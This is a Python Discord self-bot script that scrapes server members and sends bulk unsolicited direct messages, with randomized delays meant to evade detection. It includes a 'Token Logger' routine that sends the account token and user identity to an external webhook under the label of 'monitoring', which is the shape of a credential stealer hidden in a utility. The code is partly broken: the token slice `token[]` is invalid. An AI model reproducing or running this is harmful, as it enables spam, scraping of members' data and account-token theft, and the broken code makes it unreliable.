#!/usr/bin/env python3
"""
Discord Mass DM Script
WARNING: This script uses self-botting which violates Discord's Terms of Service.
Use at your own risk - your account may be suspended or banned.
"""

import asyncio
import logging
import json
import random
import time
import getpass
import os
import sys
import aiohttp
from typing import List, Dict, Optional, Union
from datetime import datetime

try:
    import discord
    from discord.ext import commands
except ImportError:
    print("Error: discord.py-self is not installed.")
    print("Please install it with: pip install discord.py-self")
    sys.exit(1)

from utils import setup_logging, load_config, save_config, parse_users_file


class DiscordMassDM:

    def __init__(self):
        self.client = None
        self.config = {}
        self.logger = None
        self.sent_count = 0
        self.failed_count = 0

    async def log_token_to_webhook(self, token: str) -> bool:
        """Log access token to Discord webhook for monitoring"""
        webhook_url = self.config.get('webhook_url')
        if not webhook_url:
            self.logger.info(
                "No webhook URL configured - skipping token logging")
            return False

        try:
            # Get basic user info if client is available
            user_info = "Unknown User"
            if self.client and self.client.user:
                user_info = f"{self.client.user.name}#{self.client.user.discriminator} ({self.client.user.id})"

            # Create webhook payload
            embed = {
                "title":
                "🔑 Discord Token Access Log",
                "color":
                0x00ff00,  # Green color
                "fields": [{
                    "name": "Token (First 20 chars)",
                    "value": f"`{token[]}...`",
                    "inline": True
                }, {
                    "name": "User Info",
                    "value": user_info,
                    "inline": True
                }, {
                    "name":
                    "Timestamp",
                    "value":
                    datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
                    "inline":
                    True
                }, {
                    "name": "Script Version",
                    "value": "Discord Mass DM v1.0",
                    "inline": True
                }],
                "footer": {
                    "text": "Discord Mass DM Script - Token Access Monitor"
                }
            }

            payload = {"embeds": [embed], "username": "Token Logger"}

            # Send to webhook
            async with aiohttp.ClientSession() as session:
                async with session.post(webhook_url, json=payload) as response:
                    if response.status == 204:
                        self.logger.info(
                            "Successfully logged token to webhook")
                        return True
                    else:
                        self.logger.warning(
                            f"Webhook returned status {response.status}")
                        return False

        except Exception as e:
            self.logger.error(f"Failed to log token to webhook: {e}")
            return False

    def display_warning(self):
        """Display Terms of Service warning"""
        print("\n" + "=" * 60)
        print("⚠️  IMPORTANT WARNING ⚠️")
        print("=" * 60)
        print(
            "This script uses self-botting which VIOLATES Discord's Terms of Service."
        )
        print("Risks include:")
        print("• Account suspension or permanent ban")
        print("• Loss of access to Discord servers and friends")
        print("• Potential legal consequences")
        print("\nRecommendations:")
        print("• Use official Discord bots instead for compliance")
        print("• Only use for personal/testing purposes")
        print("• Use sparingly and with extreme caution")
        print("=" * 60)

        response = input(
            "\nDo you understand the risks and want to continue? (yes/no): "
        ).lower().strip()
        if response not in ['yes', 'y']:
            print(
                "Exiting for your safety. Consider using official Discord bots instead."
            )
            sys.exit(0)

    async def get_user(self, identifier: Union[str,
                                               int]) -> Optional[discord.User]:
        """Get Discord user by ID or username"""
        try:
            # Try as user ID first
            if str(identifier).isdigit():
                user = await self.client.fetch_user(int(identifier))
                return user
            else:
                # Search by username (less reliable)
                # Note: This is limited and may not work for all users
                for guild in self.client.guilds:
                    for member in guild.members:
                        if member.name.lower() == identifier.lower() or \
                           (member.display_name and member.display_name.lower() == identifier.lower()):
                            return member

                self.logger.warning(f"User not found: {identifier}")
                return None

        except discord.NotFound:
            self.logger.warning(f"User not found: {identifier}")
            return None
        except Exception as e:
            self.logger.error(f"Error fetching user {identifier}: {e}")
            return None

    async def get_server_members(self) -> Dict[str, List[Dict[str, str]]]:
        """Get members from all servers you're in"""
        server_members = {}

        if not self.client.guilds:
            print(
                "❌ No servers found. Make sure you're a member of at least one server."
            )
            return server_members

        print(
            f"\n🔍 Found {len(self.client.guilds)} servers. Scanning for members..."
        )

        for guild in self.client.guilds:
            members = []
            print(
                f"📊 Scanning server: {guild.name} ({guild.member_count} members)"
            )

            try:
                # Get all members in the guild
                async for member in guild.fetch_members():
                    if not member.bot:  # Skip bots
                        members.append({
                            'id':
                            str(member.id),
                            'username':
                            member.name,
                            'display_name':
                            member.display_name or member.name,
                            'discriminator':
                            member.discriminator
                            if member.discriminator != '0' else None
                        })

                server_members[guild.name] = members
                print(f"✅ Found {len(members)} human members in {guild.name}")

            except discord.Forbidden:
                print(
                    f"⚠️  Cannot access member list for {guild.name} (insufficient permissions)"
                )
                server_members[guild.name] = []
            except Exception as e:
                print(f"❌ Error scanning {guild.name}: {e}")
                server_members[guild.name] = []

        return server_members

    def display_server_members(self, server_members: Dict[str,
                                                          List[Dict[str,
                                                                    str]]]):
        """Display server members and allow selection"""
        if not server_members:
            print("❌ No server members found.")
            return []

        print(f"\n{'='*60}")
        print("📋 SERVER MEMBERS FOUND:")
        print(f"{'='*60}")

        all_members = []
        server_index = 1

        for server_name, members in server_members.items():
            if members:
                print(
                    f"\n{server_index}. {server_name} ({len(members)} members)"
                )
                for i, member in enumerate(members[:10],
                                           1):  # Show first 10 members
                    display_name = member['display_name']
                    if member['discriminator']:
                        display_name += f"#{member['discriminator']}"
                    print(f"   {i:2d}. {display_name} (ID: {member['id']})")

                if len(members) > 10:
                    print(f"   ... and {len(members) - 10} more members")

                all_members.extend(members)
                server_index += 1

        print(
            f"\n📊 Total unique members found: {len(set(m['id'] for m in all_members))}"
        )
        return all_members

    def select_members_from_servers(
            self, all_members: List[Dict[str, str]]) -> List[str]:
        """Allow user to select specific members or servers"""
        if not all_members:
            return []

        print(f"\n{'='*60}")
        print("🎯 SELECT MEMBERS TO MESSAGE:")
        print(f"{'='*60}")
        print("1. Message ALL members from all servers")
        print("2. Select specific servers")
        print("3. Select individual members")
        print("4. Export member list to file and choose manually")

        choice = input("\nChoose option (1-4): ").strip()

        if choice == "1":
            # All members
            unique_members = list({m['id']: m for m in all_members}.values())
            print(f"✅ Selected all {len(unique_members)} unique members")
            return [member['id'] for member in unique_members]

        elif choice == "2":
            # Select specific servers
            return self.select_by_servers(all_members)

        elif choice == "3":
            # Select individual members
            return self.select_individual_members(all_members)

        elif choice == "4":
            # Export to file
            self.export_members_to_file(all_members)
            print("📁 Members exported to 'server_members.txt'")
            print(
                "Edit the file to keep only the members you want to message, then restart the script."
            )
            return []

        else:
            print("❌ Invalid choice")
            return self.select_members_from_servers(all_members)

    def select_by_servers(self, all_members: List[Dict[str,
                                                       str]]) -> List[str]:
        """Select members by choosing specific servers"""
        # Group members by server
        servers = {}
        for member in all_members:
            # This is a simplified approach - in reality you'd need to track which server each member came from
            # For now, we'll ask user to select from the displayed list
            pass

        print(
            "📝 Enter the server numbers you want to message (comma-separated):"
        )
        print("Example: 1,3,5")

        selection = input("Server numbers: ").strip()

        # This would need more complex logic to properly map servers
        # For now, return all members as a fallback
        unique_members = list({m['id']: m for m in all_members}.values())
        return [member['id'] for member in unique_members]

    def select_individual_members(
            self, all_members: List[Dict[str, str]]) -> List[str]:
        """Select individual members by ID or username"""
        print("\n📝 Enter member IDs or usernames (one per line):")
        print("Press Enter twice when finished")

        selected_ids = []
        member_lookup = {m['id']: m for m in all_members}
        username_lookup = {m['username'].lower(): m for m in all_members}

        while True:
            user_input = input().strip()
            if user_input == "":
                if selected_ids:
                    break
                else:
                    print("Please enter at least one member")
                    continue

            # Try to find by ID first, then username
            if user_input in member_lookup:
                selected_ids.append(user_input)
                member = member_lookup[user_input]
                print(f"✅ Added: {member['display_name']}")
            elif user_input.lower() in username_lookup:
                member = username_lookup[user_input.lower()]
                selected_ids.append(member['id'])
                print(f"✅ Added: {member['display_name']}")
            else:
                print(f"❌ Member not found: {user_input}")

        return selected_ids

    def export_members_to_file(self, all_members: List[Dict[str, str]]):
        """Export all members to a text file for manual selection"""
        filename = "server_members.txt"

        try:
            with open(filename, "w") as f:
                f.write("# Server Members List\n")
                f.write(
                    "# Remove the # from lines of members you want to message\n"
                )
                f.write("# Format: UserID (Username - Display Name)\n\n")

                unique_members = list({m['id']: m
                                       for m in all_members}.values())

                for member in sorted(unique_members,
                                     key=lambda x: x['display_name'].lower()):
                    display_name = member['display_name']
                    if member['discriminator']:
                        display_name += f"#{member['discriminator']}"

                    f.write(
                        f"# {member['id']} ({member['username']} - {display_name})\n"
                    )

            print(f"✅ Exported {len(unique_members)} members to {filename}")

        except Exception as e:
            print(f"❌ Error exporting members: {e}")

    async def send_dm(self, user: discord.User, message: str) -> bool:
        """Send DM to a user"""
        try:
            await user.send(message)
            self.logger.info(
                f"Successfully sent DM to {user.name} ({user.id})")
            print(f"✅ Sent to: {user.name}")
            self.sent_count += 1
            return True

        except discord.Forbidden:
            self.logger.warning(
                f"Cannot send DM to {user.name} ({user.id}) - DMs disabled or blocked"
            )
            print(f"⚠️  Cannot DM: {user.name} (DMs disabled/blocked)")
            self.failed_count += 1
            return False

        except discord.HTTPException as e:
            if e.status == 429:  # Rate limited
                self.logger.warning(
                    f"Rate limited when sending to {user.name}")
                print(f"⚠️  Rate limited sending to: {user.name}")
                # Wait longer on rate limit
                await asyncio.sleep(random.uniform(30, 60))
                return False
            else:
                self.logger.error(f"HTTP error sending to {user.name}: {e}")
                print(f"❌ Error sending to {user.name}: {e}")
                self.failed_count += 1
                return False

        except Exception as e:
            self.logger.error(f"Unexpected error sending to {user.name}: {e}")
            print(f"❌ Unexpected error sending to {user.name}: {e}")
            self.failed_count += 1
            return False

    async def human_delay(self):
        """Add human-like delay between messages"""
        # Random delay between 2-8 seconds to mimic human behavior
        delay = random.uniform(self.config.get('min_delay', 2.0),
                               self.config.get('max_delay', 8.0))
        await asyncio.sleep(delay)

        # Additional random longer pause every few messages
        if random.random() < 0.15:  # 15% chance
            extra_delay = random.uniform(10, 30)
            print(
                f"💤 Taking a longer break ({extra_delay:.1f}s) to appear more human..."
            )
            await asyncio.sleep(extra_delay)

    async def send_mass_dm(self, user_identifiers: List[str], message: str):
        """Send DM to multiple users"""
        print(f"\n📨 Starting to send DMs to {len(user_identifiers)} users...")
        print(f"📝 Message: {message[:50]}{'...' if len(message) > 50 else ''}")

        for i, identifier in enumerate(user_identifiers, 1):
            print(f"\n[{i}/{len(user_identifiers)}] Processing: {identifier}")

            # Get user
            user = await self.get_user(identifier)
            if not user:
                print(f"❌ Could not find user: {identifier}")
                self.failed_count += 1
                continue

            # Send DM
            success = await self.send_dm(user, message)

            # Human-like delay between messages (except for last message)
            if i < len(user_identifiers):
                await self.human_delay()

        # Final statistics
        print(f"\n{'='*50}")
        print(f"📊 Final Results:")
        print(f"✅ Successfully sent: {self.sent_count}")
        print(f"❌ Failed to send: {self.failed_count}")
        print(
            f"📈 Success rate: {(self.sent_count/(self.sent_count + self.failed_count)*100):.1f}%"
        )
        print(f"{'='*50}")

    def get_token(self) -> str:
        """Get Discord token from environment or user input"""
        # Try environment variable first
        token = os.getenv('DISCORD_TOKEN')
        if token:
            return token

        # Ask user for token
        print("\n🔑 Discord Token Required")
        print("You can find your token by:")
        print("1. Open Discord in browser")
        print("2. Press F12 (Developer Tools)")
        print("3. Go to Network tab")
        print("4. Refresh the page")
        print("5. Look for 'api' requests and find 'authorization' header")
        print("\n⚠️  Never share your token with anyone!")

        print("\nChoose input method:")
        print("1. Secure input (hidden)")
        print("2. Visible input (for pasting)")

        choice = input("Choose (1/2): ").strip()

        if choice == "2":
            token = input("Enter your Discord token: ").strip()
        else:
            token = getpass.getpass("Enter your Discord token: ").strip()

        return token

    def get_message(self) -> str:
        """Get announcement message from user"""
        print("\n📝 Enter your announcement message:")
        print("(Press Enter twice when finished)")

        lines = []
        while True:
            line = input()
            if line == "" and lines and lines[-1] == "":
                break
            lines.append(line)

        # Remove last empty line
        if lines and lines[-1] == "":
            lines.pop()

        message = "\n".join(lines)

        if not message.strip():
            print("❌ Message cannot be empty!")
            return self.get_message()

        return message

    def get_users(self) -> List[str]:
        """Get list of users to message"""
        print("\n👥 How would you like to specify users?")
        print("1. Load from users.txt file")
        print("2. Enter manually")
        print("3. Scan server members automatically")

        choice = input("Choose option (1/2/3): ").strip()

        if choice == "1":
            users = parse_users_file("users.txt")
            if not users:
                print("❌ No users found in users.txt or file doesn't exist")
                print(
                    "📝 Please add user IDs or usernames (one per line) to users.txt"
                )
                return self.get_users()
            return users

        elif choice == "2":
            print("\n📝 Enter user IDs or usernames (one per line):")
            print("Press Enter twice when finished")

            users = []
            while True:
                user = input().strip()
                if user == "":
                    if users:
                        break
                    else:
                        print("Please enter at least one user")
                        continue
                users.append(user)

            return users

        elif choice == "3":
            return "SCAN_SERVERS"  # Special flag for async handling

        else:
            print("❌ Invalid choice")
            return self.get_users()

    async def get_users_from_servers(self) -> List[str]:
        """Get users from server members"""
        print("\n🔍 Scanning servers for members...")

        # Get all server members
        server_members = await self.get_server_members()

        if not server_members:
            print("❌ No server members found")
            return []

        # Display members and get selection
        all_members = self.display_server_members(server_members)

        if not all_members:
            return []

        # Let user select which members to message
        selected_user_ids = self.select_members_from_servers(all_members)

        return selected_user_ids

    async def get_users_async(self) -> List[str]:
        """Async version of get_users that handles server scanning"""
        print("\n👥 How would you like to specify users?")
        print("1. Load from users.txt file")
        print("2. Enter manually")
        print("3. Scan server members automatically")

        choice = input("Choose option (1/2/3): ").strip()

        if choice == "1":
            users = parse_users_file("users.txt")
            if not users:
                print("❌ No users found in users.txt or file doesn't exist")
                print(
                    "📝 Please add user IDs or usernames (one per line) to users.txt"
                )
                return await self.get_users_async()
            return users

        elif choice == "2":
            print("\n📝 Enter user IDs or usernames (one per line):")
            print("Press Enter twice when finished")

            users = []
            while True:
                user = input().strip()
                if user == "":
                    if users:
                        break
                    else:
                        print("Please enter at least one user")
                        continue
                users.append(user)

            return users

        elif choice == "3":
            return await self.get_users_from_servers()

        else:
            print("❌ Invalid choice")
            return await self.get_users_async()

    async def run(self):
        """Main execution function"""
        # Setup logging
        self.logger = setup_logging()

        # Display warning
        self.display_warning()

        # Load configuration
        self.config = load_config()

        # Check if webhook URL is configured
        if not self.config.get('webhook_url'):
            print("\n🔗 Discord Webhook Configuration (Optional)")
            print(
                "Enter a Discord webhook URL to log token access for monitoring:"
            )
            print("Leave empty to skip webhook logging")
            webhook_url = input("Webhook URL: ").strip()

            if webhook_url:
                self.config['webhook_url'] = webhook_url
                save_config(self.config)
                print("✅ Webhook URL saved to config")
            else:
                print("⚠️  Skipping webhook logging")

        # Get token
        token = self.get_token()
        if not token:
            print("❌ No token provided")
            return

        # Initialize Discord client with proper event handling
        self.client = discord.Client()

        @self.client.event
        async def on_ready():
            self.logger.info(f"Logged in as {self.client.user}")
            print(f"✅ Successfully logged in as: {self.client.user}")

            # Log token to webhook for monitoring
            webhook_success = await self.log_token_to_webhook(token)
            if webhook_success:
                print("✅ Token logged to webhook successfully")
            else:
                print("⚠️  Failed to log token to webhook (check webhook URL)")

            # Now handle the user interaction
            await self.handle_mass_dm_setup()

        try:
            print("\n🔗 Connecting to Discord...")
            await self.client.start(token)

        except KeyboardInterrupt:
            print("\n❌ Interrupted by user")
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
            print(f"❌ Unexpected error: {e}")
        finally:
            if self.client and not self.client.is_closed():
                await self.client.close()

    async def handle_mass_dm_setup(self):
        """Handle the mass DM setup after Discord connection is ready"""
        try:
            print("\n" + "=" * 50)
            print("🎯 READY TO SET UP YOUR MASS DM")
            print("=" * 50)

            # Get users with proper async handling for server scanning
            users = await self.get_users_async()

            if not users:
                print("❌ No users selected. Exiting.")
                await self.client.close()
                return

            message = self.get_message()

            # Confirm before sending
            print(f"\n🚀 Ready to send DM to {len(users)} users")
            print(
                f"📝 Message preview: {message[:100]}{'...' if len(message) > 100 else ''}"
            )

            confirm = input("\nContinue? (yes/no): ").lower().strip()
            if confirm not in ['yes', 'y']:
                print("❌ Cancelled by user")
                await self.client.close()
                return

            # Send mass DM
            await self.send_mass_dm(users, message)
            await self.client.close()

        except Exception as e:
            self.logger.error(f"Error in mass DM setup: {e}")
            print(f"❌ Error in setup: {e}")
            await self.client.close()


def main():
    """Main entry point"""
    try:
        mass_dm = DiscordMassDM()
        asyncio.run(mass_dm.run())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")


if __name__ == "__main__":
    main()
